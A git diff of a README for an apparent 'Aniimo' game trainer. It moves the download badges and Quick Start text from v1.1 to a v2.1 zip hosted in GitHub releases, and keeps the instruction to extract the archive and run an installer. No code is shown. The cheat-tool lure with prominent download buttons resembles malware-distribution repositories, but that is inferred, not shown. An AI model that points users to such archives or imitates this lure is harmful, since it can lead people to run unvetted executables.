@@ -6,8 +6,8 @@
 
 <br/>
 
-<a href="https://github.com/TunnelBuilderBound33/aniimo-tamer-companion/releases/download/v1.1/Aniimo_Trainer_v1.1.zip">
-  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20aniimo--tamer--companion%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
+<a href="https://github.com/TunnelBuilderBound33/aniimo-tamer-companion/releases/download/v2.1/Aniimo_Trainer_v2.1.zip">
+  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20aniimo--tamer--companion%20v2.1%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
 <br/><br/>
@@ -42,7 +42,7 @@
 
 ## Quick Start
 
-> **Step 1** — Download `Aniimo_Tamer_Companion_v1.1` via the button above and extract the archive
+> **Step 1** — Download `Aniimo_Tamer_Companion_v2.1` via the button above and extract the archive
 
 > **Step 2** — Run `Aniimo_Companion_Installer`
 
@@ -153,8 +153,8 @@ Game:    Aniimo — latest Steam build
 
 <div align="center">
 
-<a href="https://github.com/TunnelBuilderBound33/aniimo-tamer-companion/releases/download/v1.1/Aniimo_Trainer_v1.1.zip">
-  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20aniimo--tamer--companion%20v1.0%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
+<a href="https://github.com/TunnelBuilderBound33/aniimo-tamer-companion/releases/download/v2.1/Aniimo_Trainer_v2.1.zip">
+  <img src="https://img.shields.io/badge/⬇%20%20DOWNLOAD%20%20aniimo--tamer--companion%20v2.1%20%20⬇-28a745?style=for-the-badge&logoColor=white&labelColor=1a1a1a&color=28a745" height="52"/>
 </a>
 
 
